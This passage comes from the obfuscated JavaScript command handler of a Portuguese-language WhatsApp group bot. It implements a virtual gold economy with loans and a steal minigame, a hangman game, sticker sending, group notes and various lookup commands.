                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x33d21e) {
                  return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
                }
                let _0x49ddaa = rggold[_0x3befc0].usus.find(_0x54c386 => _0x54c386.id === _0x246d48);
                if (_0x49ddaa.emp_G && _0x49ddaa.emp_G.length > 0) {
                  let _0xf5e8c3 = rggold[_0x3befc0].usus.find(_0x5a2620 => _0x5a2620.id === _0x49ddaa.emp_G[0].id);
                  let _0x1f10f8 = Math.floor(_0x49ddaa.emp_G[0].Golds);
                  if (Math.floor(_0x49ddaa.Golds) < _0x1f10f8 + _0x1f10f8 * 0.15) {
                    return _0x50740b("Você não tem Golds o suficiente para pagar o empréstimo, valor: " + (_0x1f10f8 + _0x1f10f8 * 0.15));
                  }
                  _0x5dcc57("Parabéns, você realizou o pagamento do empréstimo de: @" + _0x49ddaa.emp_G[0].id.split('@')[0] + ", será pago com mais +15% de taxa de juros por ser umempréstimo, valor: " + (_0x1f10f8 + _0x1f10f8 * 0.15));
                  _0xf5e8c3.Golds += Math.floor(_0x1f10f8 + _0x1f10f8 * 0.15);
                  _0x49ddaa.Golds -= Math.floor(_0x1f10f8 + _0x1f10f8 * 0.15);
                  _0x49ddaa.emp_G = [];
                  _0x1564b4(rggold);
                } else {
                  _0x50740b("Você não tem nenhum empréstimo para pagar.");
                }
              }
              break;
            case "cobrargold":
            case "cobrargolds":
            case "cobraremprestimo":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x33d21e) {
                  return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
                }
                if (!_0x5e13bf) {
                  return _0x50740b("Marque o usuário que você fez o empréstimo para cobrar.");
                }
                let _0x248650 = rggold[_0x3befc0].usus.find(_0x58f314 => _0x58f314.id === _0x5e13bf);
                let _0x371a80 = rggold[_0x3befc0].usus.find(_0x2ef14e => _0x2ef14e.id === _0x246d48);
                let _0x196698 = Math.floor(Date.now() / 1000);
                if (_0x248650?.["emp_G"]?.["length"] > 0) {
                  if (_0x248650.emp_G[0].id !== _0x246d48) {
                    return _0x50740b("Você não fez nenhum empréstimo a este usuário.");
                  }
                  let _0xe65b61 = Math.floor(_0x248650.emp_G[0].Golds);
                  if (_0x196698 < Math.floor(_0x248650.emp_G[0].Tempo)) {
                    return _0x50740b("Ainda falta: " + kyun(Math.floor(_0x248650.emp_G[0].Tempo) - _0x196698) + ", tem que aguardar no mínimo 1 dia para poder cobrar um usuário, do empréstimo que você fez.");
                  }
                  if (Math.floor(_0x248650.Golds) < _0xe65b61 + _0xe65b61 * 0.15) {
                    return _0x50740b("O usuário não tem a quantidade de Golds que te deve com os 15%.");
                  }
                  _0x50740b("Golds cobrado com sucesso + os 15%, igual: " + (_0xe65b61 + _0xe65b61 * 0.15) + ", até a próxima.");
                  _0x248650.Golds -= Math.floor(_0xe65b61 + _0xe65b61 * 0.15);
                  _0x371a80.Golds += Math.floor(_0xe65b61 + _0xe65b61 * 0.15);
                  _0x248650.emp_G = [];
                  _0x1564b4(rggold);
                } else {
                  return _0x50740b("Este usuário não tem nenhum empréstimo para pagar não.");
                }
              }
              break;
            case "infoemprestimo":
              _0x50740b("é composto por:\n\n1 - " + _0x141936 + "emprestargold @xpessoa/100\n\n2 - " + _0x141936 + "aceitaremprestimo\n\n3 - " + _0x141936 + "recusaremprestimo\n\n4 - " + _0x141936 + "cobraremprestimo\n\n5 - " + _0x141936 + "pagaremprestimo\n\n");
              break;
            case "roubargold":
            case "roubargolds":
            case "vingancagold":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x33d21e) {
                return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
              }
              if (!_0x5e13bf) {
                return _0x50740b("Marque o @ ou a mensagem do usuário que deseja roubar, Exemplo: " + (_0x141936 + _0x267d4b) + " @Xpessoa");
              }
              if (_0x5e13bf === _0x517366) {
                return _0x50740b("Você não pode me roubar 😡...");
              }
              if (_0x5e13bf === _0x246d48) {
                return _0x50740b("Não pode roubar você mesmo..");
              }
              var _0x5ae523 = _0x326cbd[0].Chances.find(_0xedcb56 => _0xedcb56.id === _0x5e13bf);
              if (_0x267d4b !== "vingancagold" && _0x3de59a.RS_C(_0x246d48, "ChanceR", []).length >= 5) {
                return _0x50740b("Infelizmente suas chances de roubar por hoje foi encerrada, tente novamente amanhã..");
              }
              if (_0x267d4b !== "vingancagold" && _0x3de59a.RS_C(_0x246d48, "ChanceR")?.["includes"](_0x5e13bf)) {
                return _0x50740b("Você já roubou este usuário hoje, só pode uma vez, e só são 5 roubos de membros diferentes por dia.");
              }
              if (_0x267d4b === "vingancagold" && _0x3de59a.RS_C(_0x246d48, "Vinganca") > 0) {
                return _0x50740b("Que pena, sua vingança já foi executada hoje, só poderá novamente amanhã, ou então poderá comprar com 50 Golds, usando " + _0x141936 + "comprar vingançagold");
              }
              if (_0x267d4b === "vingancagold" && !_0x3de59a.RS_C(_0x5e13bf, "ChanceR")?.["includes"](_0x246d48)) {
                return _0x50740b("Você não tem como se vingar desse usuário, porque ele não roubou você hoje.");
              }
              var _0x518694 = _0x3de59a.RS(_0x5e13bf, "Golds");
              var _0x129fdd = _0x3de59a.RS(_0x246d48, "Golds");
              if (_0x129fdd <= 0) {
                return _0x50740b("Você não tem gold para tentar roubar alguém, tem que conter no mínimo 1 Gold.");
              }
              if (_0x518694 <= 0) {
                return _0x50740b("O usuário que você está tentando roubar, não tem nenhum Gold..");
              }
              if (_0x5ae523.Escudo?.["length"] > 0) {
                RB_F = 2;
                if (Math.floor(Math.random() * RB_F) === 0) {
                  _0x50740b("O usuário estava de escudo, e você conseguiu quebrar, parabéns.");
                  _0x5ae523.Escudo = [];
                } else {
                  function _0x294bff() {
                    if (_0x267d4b === "vingancagold") {
                      _0x3de59a.ADD_C(_0x246d48, "Vinganca", 1);
                    } else {
                      false;
                    }
                    if (_0x267d4b !== "vingancagold") {
                      _0x3de59a.ADD_C_P(_0x246d48, "ChanceR", _0x5e13bf);
                    } else {
                      null;
                    }
                    _0x50740b("O usuário está de escudo, e você não conseguiu quebrar, você não conseguiu nada, sinto muito.");
                  }
                  return _0x294bff();
                }
                _0x137e44(_0x326cbd);
              }
              var _0xf05dda = Math.floor(Math.random() * 3);
              var _0x128342 = Math.floor(Math.random() * _0x518694);
              var _0xa5b409 = Math.floor(Math.random() * _0x129fdd);
              let _0x16d807 = ["Parabéns pelo feito incrível de roubar " + _0x128342 + " Golds do destemido usuário @" + _0x5e13bf.split('@')[0] + '!', "Você mostrou suas habilidades astutas ao conquistar " + _0x128342 + " Golds das mãos de @" + _0x5e13bf.split('@')[0] + ". Parabéns!", "Aqui está a sua merecida recompensa por pilhar " + _0x128342 + " Golds de @" + _0x5e13bf.split('@')[0] + ". Brilhante!", "A premiação é sua por conquistar " + _0x128342 + " Golds em um ousado roubo contra @" + _0x5e13bf.split('@')[0] + ". Impressionante!", "Pelo seu talento em subtrair " + _0x128342 + " Golds de @" + _0x5e13bf.split('@')[0] + ", concedemos este prêmio de destreza.", "Você se destacou ao conquistar " + _0x128342 + " Golds do usuário @" + _0x5e13bf.split('@')[0] + ". Aceite este reconhecimento!", "Por sua audácia em obter " + _0x128342 + " Golds por meio de um roubo, apresentamos este prêmio.", "Seu sucesso em tomar " + _0x128342 + " Golds de @" + _0x5e13bf.split('@')[0] + " merece aplausos e esta premiação especial.", "Uma conquista notável: " + _0x128342 + " Golds roubados de @" + _0x5e13bf.split('@')[0] + ". Receba este prêmio em reconhecimento.", "Parabenizamos sua habilidade em conseguir " + _0x128342 + " Golds por meios engenhosos de @" + _0x5e13bf.split('@')[0] + ". Aqui está o seu prêmio!", "Sua destemida façanha de " + _0x128342 + " Golds roubados é celebrada com esta premiação.", "Apresentamos este prêmio em honra ao seu talento demonstrado ao conseguir " + _0x128342 + " Golds de @" + _0x5e13bf.split('@')[0] + '.', "Você provou ser um mestre da esperteza ao adquirir " + _0x128342 + " Golds de @" + _0x5e13bf.split('@')[0] + ". Receba este prêmio com louvor!", "Sua proeza em roubar " + _0x128342 + " Golds merece reconhecimento. Aceite este prêmio como lembrança.", "Pelo seu esforço em adquirir " + _0x128342 + " Golds por meios engenhosos, apresentamos este prêmio merecido.", "Parabéns por superar os desafios e conseguir " + _0x128342 + " Golds em um roubo ousado. Aqui está o seu prêmio!", "Sua conquista de " + _0x128342 + " Golds roubados de @" + _0x5e13bf.split('@')[0] + " é recompensada com este prêmio de excelência.", "Em homenagem à sua habilidade em conseguir " + _0x128342 + " Golds, concedemos este prêmio de maestria.", "Você se destacou ao conquistar " + _0x128342 + " Golds de @" + _0x5e13bf.split('@')[0] + " de forma impressionante. Aceite este prêmio como símbolo de sucesso!", "Pela sua destreza em adquirir " + _0x128342 + " Golds por meios criativos, é com prazer que lhe entregamos esta premiação."];
              let _0x254f7c = ["Infelizmente, sua tentativa de roubo resultou em fracasso, e você perdeu " + _0xa5b409 + " Golds para @" + _0x5e13bf.split('@')[0] + ". Melhor sorte da próxima vez!", "Parece que a sorte não estava ao seu lado desta vez. " + _0xa5b409 + " Golds foram perdidos para @" + _0x5e13bf.split('@')[0] + " devido à sua tentativa de roubo malsucedida.", "Um valente esforço, mas sua tentativa de roubo não teve sucesso. " + _0xa5b409 + " Golds agora pertencem a @" + _0x5e13bf.split('@')[0] + '.', _0xa5b409 + " Golds foram subtraídos de você como resultado de uma tentativa de roubo malsucedida contra @" + _0x5e13bf.split('@')[0] + ". Não desanime!", "Seus planos foram frustrados e você perdeu " + _0xa5b409 + " Golds na tentativa de roubo contra @" + _0x5e13bf.split('@')[0] + ". O jogo continua!", "Às vezes, até as melhores estratégias falham. " + _0xa5b409 + " Golds foram perdidos na tentativa de roubo contra @" + _0x5e13bf.split('@')[0] + '.', "Uma tentativa corajosa, mas sua estratégia não funcionou desta vez. " + _0xa5b409 + " Golds foram perdidos para @" + _0x5e13bf.split('@')[0] + '.', "Sua tentativa de roubo não teve êxito e resultou na perda de " + _0xa5b409 + " Golds para @" + _0x5e13bf.split('@')[0] + ". Hora de se reagrupar!", "Uma jornada arriscada, mas sua tentativa de roubo falhou, levando à perda de " + _0xa5b409 + " Golds para @" + _0x5e13bf.split('@')[0] + '.', "A tentativa de roubo não deu frutos desta vez. " + _0xa5b409 + " Golds agora estão nas mãos de @" + _0x5e13bf.split('@')[0] + '.'];
              var _0x135955 = _0x16d807[Math.floor(Math.random() * _0x16d807.length)];
              var _0x22237f = _0x254f7c[Math.floor(Math.random() * _0x254f7c.length)];
              if (_0xf05dda === 0) {
                _0x3de59a.R_A(_0x5e13bf, _0x246d48, _0x128342);
                _0x5dcc57(_0x135955);
              } else {
                if (_0xf05dda === 1) {
                  _0x3de59a.R_A(_0x246d48, _0x5e13bf, _0xa5b409);
                  _0x5dcc57(_0x22237f);
                } else {
                  _0x5dcc57("Sinto muito, você tentou roubar o usuário @" + _0x5e13bf.split('@')[0] + ", e não conseguiu roubar nada, voltou de mãos vazias 😪..");
                }
              }
              if (_0x267d4b === "vingancagold") {
                _0x3de59a.ADD_C(_0x246d48, "Vinganca", 1);
              } else {
                false;
              }
              if (_0x267d4b !== "vingancagold") {
                _0x3de59a.ADD_C_P(_0x246d48, "ChanceR", _0x5e13bf);
              } else {
                null;
              }
              _0x137e44(_0x326cbd);
              break;
            case "minerar_gold":
            case "minerar_golds":
            case "minerargold":
            case "minerargolds":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x33d21e) {
                return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
              }
              if (_0x3de59a.RS_C(_0x246d48, "ChanceG") >= 3) {
                return _0x50740b("Você não tem mais chances de minerar Gold, volte amanhã...");
              }
              _0x3de59a.ADD_C_M(_0x246d48, "ChanceG", 1);
              rnd = Math.floor(Math.random() * 2);
              rndg = Math.floor(Math.random() * 50);
              if (rnd == 0) {
                _0x5dcc57("Parabéns @" + _0x45b1c6 + " você recebeu " + rndg + " Golds, você só pode minerar 3 vez por dia... " + (_0x3de59a.RS_C(_0x246d48, "ChanceG") >= 3 ? "infelizmente você não tem mais chances para minerar hoje, volte amanhã.." : "Ainda resta " + _0x3de59a.RS_C(_0x246d48, "ChanceG") + "/3 para obter Golds, sua chance é 3/3"));
                _0x3de59a.ADD(_0x246d48, rndg);
              } else if (rnd != 0) {
                _0x50740b("A, você não teve sorte dessa vez, sinto muito... " + (_0x3de59a.RS_C(_0x246d48, "ChanceG") >= 3 ? "infelizmente você não tem mais chances para minerar hoje, volte amanhã.." : "Ainda resta " + _0x3de59a.RS_C(_0x246d48, "ChanceG") + "/3 para obter Golds, sua chance é 0/3"));
              }
              break;
            case "addpalavras_forca":
            case "addpalavras_f":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              var [_0x3d1990, _0x56d8c6, _0x40053b] = _0x11e99e.toLowerCase().trim().split('|');
              if (!_0x11e99e.includes('|')) {
                return _0x50740b("Faltanda a primeira |\nExemplo: " + (_0x141936 + _0x267d4b) + " titulo|tema|dica");
              }
              if (_0x11e99e.lastIndexOf('|') < 0) {
                return _0x50740b("Faltando a segunda |\nExemplo: " + (_0x141936 + _0x267d4b) + " titulo|tema|dica");
              }
              kir = [];
              for (_0x3194f3 of _0x36b9db) {
                kir.push(_0x3194f3.plvr);
              }
              if (kir.indexOf(_0x3d1990.toLowerCase().trim()) >= 0) {
                return _0x50740b("Este título já foi adicionado/existente...");
              }
              const _0x5a8f88 = {
                plvr: _0x3d1990,
                tema: _0x56d8c6,
                dica: _0x40053b
              };
              _0x36b9db.push(_0x5a8f88);
              fs.writeFileSync("./DADOS/datab/grupos/palavras_forca.json", JSON.stringify(_0x36b9db, null, 2));
              _0x50740b("Palavra adicionada ao jogo da forca com sucesso...");
              break;
            case "rmpalavra_f":
            case "rmpalavra_forca":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              var _0x5f093a = _0x36b9db.map(_0x31e5ba => _0x31e5ba.plvr).indexOf(_0x11e99e.trim().toLowerCase());
              _0x36b9db.splice(_0x5f093a, 1);
              fs.writeFileSync("./DADOS/datab/grupos/palavras_forca.json", JSON.stringify(_0x36b9db, null, 2));
              _0x50740b("Palavra tirada do jogo da forca com sucesso...");
              break;
            case "forca":
            case "mostrar_forca":
            case "ver_forca":
            case "iniciar_forca":
            case "iniciar-forca":
            case "iniciarforca":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              try {
                if (_0x326cbd[0].forca_inc) {
                  return _0x50740b("Jogo já está em andamento, caso queira resetar, fale com um adm para executar " + _0x141936 + "rv-forca, ou tente acertar o jogo da forca que deve está logo a cima.");
                }
                if (!_0x326cbd[0].forca_inc) {
                  _0x4b4b15();
                  var _0x3c3dd2 = _0x326cbd[0].forca_ofc[0];
                  _0x326cbd[0].forca_inc = true;
                  _0x137e44(_0x326cbd);
                  await sleep(300);
                  let _0x2d3b83 = " ";
                  _0x3c3dd2.palavra.some(_0x4b3c74 => {
                    _0x2d3b83 += " " + _0x4b3c74;
                  });
                  rsp_fr = "- Jogo da forca - " + _0x3c3dd2.palavra_ofc.length + " Letras\n\nTema: " + _0x3c3dd2.tema + "\n\nDica: " + _0x3c3dd2.dica + "\n\n|________\n       _¦_\n\n\n\n\n\n\n\n" + _0x2d3b83 + "\n\n_____________________\n\n_- JOGO INICIADO -_\n\nUse " + _0x141936 + "r-f letra que talvez exista por sua observação.\n\nOu " + _0x141936 + "r-f nome todo\n\n_____________________\n";
                  _0x50740b(rsp_fr);
                }
              } catch (_0x44f534) {
                console.log(_0x44f534);
              }
              break;
            case "r-forca":
            case "r-f":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x326cbd[0].forca_inc) {
                return _0x50740b("O jogo não foi iniciado.\nDigite " + _0x141936 + "iniciar_forca");
              }
              if (!_0x11e99e.toLowerCase().trim()) {
                return _0x50740b("Digite a letra que deseja responder..");
              }
              var _0x63eb13 = _0xcdaa0a.trim().toLowerCase();
              if (ANT_LTR_MD_EMJ(_0x63eb13) || Number(_0x63eb13)) {
                return _0x50740b("Não pode letras modificadas, nem emoji, nem números..");
              }
              if (_0x11e99e.trim().length == 2) {
                return _0x50740b("Digite letra por letra para tentar adivinhar, ou acerte a palavra toda, boa sorte...");
              }
              _0x3c3dd2 = _0x326cbd[0].forca_ofc[0];
              if (_0x3c3dd2.escreveu.indexOf(_0x63eb13) >= 0) {
                return _0x50740b("Esta letra já foi utilizada..");
              }
              var _0x5ff7c8 = _0x3c3dd2.palavra_ofc.includes(_0x63eb13) ? 0 : 1;
              var _0x48994f = _0x326cbd[0].forca_ofc[0].erros;
              _0x3c3dd2.escreveu.push(_0x63eb13);
              _0x137e44(_0x326cbd);
              PSC = [];
              if (_0x3c3dd2.palavra_ofc.indexOf(_0x63eb13) >= 0) {
                for (_0x3194f3 = 0; _0x3194f3 < _0x3c3dd2.palavra_ofc.length; _0x3194f3++) {
                  if (_0x3c3dd2.palavra_ofc[_0x3194f3] == _0x63eb13) {
                    PSC.push(_0x3194f3);
                    _0x3c3dd2.acertos += 1;
                  }
                }
                for (_0x3194f3 of PSC) {
                  _0x3c3dd2.palavra[_0x3194f3] = _0x63eb13;
                }
                _0x137e44(_0x326cbd);
              }
              await sleep(300);
              let _0x4a4e64 = " ";
              _0x3c3dd2.palavra.some(_0x2edfc9 => {
                _0x4a4e64 += " " + _0x2edfc9;
              });
              let _0x4dc088 = " ";
              _0x3c3dd2.escreveu.some(_0x15fb32 => {
                _0x4dc088 += _0x15fb32 + ", ";
              });
              var _0x92fae5 = "- Jogo da forca - " + _0x3c3dd2.palavra_ofc.length + " Letras\n\nTema: " + _0x3c3dd2.tema + "\n\nDica: " + _0x3c3dd2.dica + "\n\n__________-_\n\t\t\t\t\t\t\t\t\t_|_\n\n\t\t\t\t\t\t\t\t" + (_0x48994f + _0x5ff7c8 >= 1 ? '🤡' : '') + "\n\t\t\t\t\t\t" + (_0x48994f + _0x5ff7c8 >= 2 ? '👈' : '') + " " + (_0x48994f + _0x5ff7c8 >= 3 ? '👉' : '') + "\t\t\n\t\t\t\t\t\t\t\t\t" + (_0x48994f + _0x5ff7c8 >= 4 ? '👖' : '') + "\n\t\t\t\t\t\t\t\t\t" + (_0x48994f + _0x5ff7c8 >= 5 ? '👞' : '') + " " + (_0x48994f + _0x5ff7c8 >= 6 ? '👞' : '') + "\n\n" + _0x4a4e64 + "\n\n___-________-_____\n\nLetras ja utilizadas: " + _0x4dc088 + "\n___-________-_____\n";
              if (_0x11e99e.length > 2) {
                _0x50740b("Humm, espertinho quer acertar a palavra toda");
              }
              await sleep(500);
              if (_0x3c3dd2.palavra_ofc.indexOf(_0x63eb13) >= 0 || _0x63eb13.length > 2 && _0x63eb13 == _0x3c3dd2.palavra_ofc) {
                _0x50740b('' + (_0x63eb13.length > 2 ? "Você acertou a palavra toda e ganhou" + (_0x33d21e ? " 10 Golds," : " ") + "bom menino(a), irei resetar o jogo..." : _0x3c3dd2.acertos == _0x3c3dd2.palavra_ofc.length ? "Parabéns, toda palavra foi concluída : < " + _0x3c3dd2.palavra_ofc + " >" + (_0x33d21e ? " você recebeu 5 Golds, por ser o último..," : " ") + "irei resetar o jogo.." : "Você acertou uma letra e ganhou" + (_0x33d21e ? " 2 Golds " : " ") + "continue assim.."));
                if (_0x33d21e) {
                  _0x3de59a.ADD(_0x246d48, _0x11e99e.length > 2 ? 10 : _0x3c3dd2.acertos == _0x3c3dd2.palavra_ofc.length ? 5 : 2);
                }
                if (_0x63eb13.length > 2 || _0x3c3dd2.acertos == _0x3c3dd2.palavra_ofc.length) {
                  return _0x4b4b15();
                }
                await sleep(200);
                _0x50740b(_0x92fae5);
              } else {
                _0x50740b('' + (_0x63eb13.length > 2 ? "Infelizmente você perdeu" + (_0x33d21e ? " 3 Golds" : '') + ", errou a palavra toda, deveria ter tentado letra por letra né, irei resetar o jogo.." : _0x48994f + _0x5ff7c8 == 6 ? "Aa, você completou 6 Erros, e perdeu " + (_0x33d21e ? "2 Golds infelizmente," : ", ") + "irei resetar o jogo.." : "Você Errou, e perdeu " + (_0x33d21e ? "2 Golds" : '') + " 😥.."));
                if (_0x33d21e) {
                  _0x3de59a.ADD(_0x246d48, 2);
                }
                _0x326cbd[0].forca_ofc[0].erros += 1;
                _0x137e44(_0x326cbd);
                if (_0x63eb13.length > 2 || _0x48994f + _0x5ff7c8 == 6) {
                  return _0x4b4b15();
                }
                await sleep(200);
                _0x50740b(_0x92fae5);
              }
              break;
            case "figurinhas":
              if (!_0x11e99e) {
                return _0x50740b("Insira a quantidade de figurinhas que deseja que eu envie.");
              }
              if (!Number(_0x23d865[0]) || Number(_0x11e99e.trim()) > 5) {
                return _0x50740b("Digite a quantidade de figurinhas que deseja que eu envie, mas não pode ser mais do que 5.");
              }
              _0x50740b("Enviando no seu privado...");
              _0x5196be.updateBlockStatus(_0x246d48, "unblock");
              qtd = _0x11e99e.trim().replace(/\D/g, '');
              async function _0x23f478() {
                rnd = Math.floor(Math.random() * 8051);
                const _0x40362d = {
                  url: "https://raw.githubusercontent.com/badDevelopper/Testfigu/main/fig (" + rnd + ").webp"
                };
                const _0x74c77b = {
                  sticker: _0x40362d
                };
                await _0x5196be.sendMessage(_0x246d48, _0x74c77b);
              }
              for (let _0x351115 = 0; _0x351115 < qtd; _0x351115++) {
                await _0x23f478();
                await sleep(1000);
              }
              break;
            case "limpar_mortos-cnt":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!_0x89cd51) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              var _0x5efba3 = countMessage[countMessage.map(_0x15b8a8 => _0x15b8a8.groupId).indexOf(_0x346d97)].numbers;
              CNT1 = [];
              for (_0x3194f3 of groupMembers) {
                CNT1.push(_0x3194f3.id);
              }
              CNT = [];
              for (_0x3194f3 of _0x5efba3) {
                if (!CNT1.includes(_0x3194f3.id)) {
                  CNT.push(_0x3194f3);
                }
              }
              for (_0x3194f3 of CNT) {
                _0x5efba3.splice(_0x5efba3.map(_0x23d3fb => _0x23d3fb.id).indexOf(_0x3194f3.id), 1);
              }
              fs.writeFileSync("./DADOS/grupos/countmsg.json", JSON.stringify(countMessage, null, 2));
              _0x50740b("Usuários que já foi removido, ou saiu do grupo, foi tirado do contador de mensagens..");
              break;
            case "tirar_docnt":
              if (!_0xf59944) {
                return;
              }
              if (!_0x89cd51) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              var _0xb83e05 = countMessage.map(_0x2c2294 => _0x2c2294.groupId).indexOf(_0x346d97);
              var _0x573f90 = countMessage[_0xb83e05].numbers.map(_0x5aebac => _0x5aebac.id).indexOf(_0x11e99e.trim() + "@s.whatsapp.net");
              countMessage[_0xb83e05].numbers.splice(_0x573f90, 1);
              fs.writeFileSync("./DADOS/grupos/countmsg.json", JSON.stringify(countMessage, null, 2));
              _0x50740b("Usuário tirado do contador de mensagens com sucesso...");
              break;
            case "anotacao":
            case "anotacoes":
            case "nota":
            case "notas":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (_0x267d4b == "anotacao" || _0x267d4b == "nota") {
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Digite o título da anotação que deseja puxar..");
                }
                if (!JSON.stringify(anotar).includes(_0x346d97)) {
                  return _0x50740b("Este grupo não tem nenhuma anotação...");
                }
                var _0xb83e05 = anotar.map(_0x33af1e => _0x33af1e.grupo).indexOf(_0x346d97);
                if (!JSON.stringify(anotar[_0xb83e05].puxar).includes(_0x11e99e)) {
                  return _0x50740b("Não contém nenhuma anotação com este título.");
                }
                var _0x17f438 = anotar[_0xb83e05].puxar.map(_0x5217aa => _0x5217aa.nota).indexOf(_0x11e99e.trim());
                _0x5dcc57('' + anotar[_0xb83e05].puxar[_0x17f438].anotacao);
              } else {
                var _0xb83e05 = anotar.map(_0x39623f => _0x39623f.grupo).indexOf(_0x346d97);
                if (_0xb83e05 < 0) {
                  return _0x50740b("Este grupo não tem nenhuma anotação...");
                }
                var _0xb83e05 = anotar.map(_0xd72c7d => _0xd72c7d.grupo).indexOf(_0x346d97);
                var _0x5a0d13 = anotar[_0xb83e05]?.["puxar"];
                txtin = "──────────────────\n\n";
                for (_0x3194f3 = 0; _0x3194f3 < _0x5a0d13?.["length"]; _0x3194f3++) {
                  txtin += "↝ Anotação: ⟮ " + anotar[_0xb83e05]?.["puxar"][_0x3194f3]?.["nota"] + " ⟯ - \n\n" + anotar[_0xb83e05]?.["puxar"][_0x3194f3]?.["anotacao"] + "\n\n";
                }
                txtin += "──────────────────\n\n";
                _0x5dcc57(txtin);
              }
              break;
            case "download-link":
              if (_0x11e99e.includes("video") || _0x11e99e.includes("mp4")) {
                const _0x3c714d = {
                  url: _0x11e99e
                };
                const _0xd4aec9 = {
                  video: _0x3c714d,
                  mimetype: "video/mp4"
                };
                const _0x5797ef = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0xd4aec9, _0x5797ef)["catch"](_0x3f64c6 => {
                  _0x50740b("Erro, visualize se este link é válido...");
                });
              } else {
                if (_0x11e99e.includes("webp") || _0x11e99e.includes("jpg")) {
                  const _0x9b2256 = {
                    url: _0x11e99e
                  };
                  const _0x29de0b = {
                    image: _0x9b2256
                  };
                  const _0x10aa4c = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x29de0b, _0x10aa4c)["catch"](_0x941436 => {
                    _0x50740b("Erro, visualize se este link é válido...");
                  });
                }
              }
              break;
            case "signo":
              try {
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Digite seu signo, exemplo: " + (_0x141936 + _0x267d4b) + " virgem");
                }
                let _0x594e47 = await reqapi.signo(_0x11e99e.trim());
                const _0x430284 = {
                  url: _0x594e47.img
                };
                const _0x20317e = {
                  image: _0x430284,
                  caption: "Signo: " + _0x11e99e + "\n\n" + _0x594e47.title + "\n" + _0x594e47.body
                };
                _0x5196be.sendMessage(_0x346d97, _0x20317e)["catch"](_0x44cdcb => {
                  return _0x50740b("Erro..");
                });
              } catch (_0x1be9f9) {
                return _0x50740b("Erro..");
              }
              break;
            case "moedas":
            case "moeda":
              try {
                let _0x2e9a39 = await reqapi.moedas();
                _0x50740b(_0x2e9a39?.["dolar"] + "\n\n" + _0x2e9a39?.["euro"] + "\n\n" + _0x2e9a39?.["libra"] + "\n\n" + _0x2e9a39?.["bitcoin"] + "\n\n" + _0x2e9a39?.["ethereum"] + "\n\n" + _0x2e9a39?.["bovespa"] + "\n\n" + _0x2e9a39?.["ouro"]);
              } catch {
                return _0x50740b("Erro, breve volta.");
              }
              break;
            case "esportenoticias":
            case "esportenoticia":
            case "espnoticia":
            case "espnoticias":
            case "noticiasesporte":
            case "noticiaesporte":
            case "noticiaesp":
            case "noticiasesp":
            case "esporte_noticias":
            case "esporte_noticia":
            case "esporte-noticias":
            case "esporte-noticia":
              _0x50740b("Aguarde, realizando ação..");
              try {
                let _0x1cf97b = await reqapi.esporte();
                _0x29f7cd = '';
                for (_0x3194f3 = 1; _0x3194f3 < _0x1cf97b.length; _0x3194f3++) {
                  _0x29f7cd += _0x1cf97b[_0x3194f3].titulo + "\n\n";
                }
                const _0x599008 = {
                  url: _0x1cf97b[0].img
                };
                const _0x1f2195 = {
                  image: _0x599008,
                  caption: _0x29f7cd
                };
                const _0x36d0a6 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x1f2195, _0x36d0a6);
              } catch {
                return _0x50740b("Erro, tente novamente ou aguarde até voltar ao normal.");
              }
              break;
            case "playstore":
              try {
                if (_0x11e99e.length < 2) {
                  return _0x50740b("Cade o título do apk que deseja pesquisar?");
                }
                let _0x40cc33 = await reqapi.playstore(_0x11e99e.trim());
                let _0x3562c0 = "Play Store pesquisa:\n\n";
                for (let _0x57447d of _0x40cc33.resultados) {
                  _0x3562c0 += " - NOME DO APK: " + _0x57447d.title + "\n - ID: " + _0x57447d.appId + "\n - URL: " + _0x57447d.url + "\n\n" + '-'.repeat(20) + "\n\n";
                }
                _0x50740b(_0x3562c0);
              } catch (_0x15485a) {
                return _0x50740b("Erro...");
              }
              break;
            case "logos1":
              if (!_0x11e99e.trim()) {
                return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " Aleatory");
              }
              var _0x75423d = ["shadow", "metalgold", "cup", "txtborboleta", "cemiterio", "efeitoneon", "harryp", "lobometal", "neon2", "madeira", "lovemsg3", "coffecup", "coffecup2", "florwooden", "narutologo", "fire", "romantic", "smoke", "papel", "lovemsg", "lovemsg2", "fiction", "3dstone", "areia", "style", "blood", "pink", "cattxt", "neondevil", "carbon", "metalfire", "thunder", "vidro", "jokerlogo", "transformer", "demonfire", "jeans", "metalblue", "natal", "ossos", "asfalto", "break", "glitch2", "colaq", "neon3", "nuvem", "horror", "matrix", "berry", "luxury", "lava", "thunderv2", "neongreen", "neve", "neon", "neon1", "neon3d", "gelo", "neon3", "3dgold", "lapis", "toxic", "demongreen", "rainbow", "halloween", "angelwing", "hackneon", "fpsmascote", "equipemascote", "txtquadrinhos", "ffavatar", "mascotegame", "angelglx", "gizquadro", "wingeffect", "blackpink", "metalgold", "girlmascote", "logogame"];
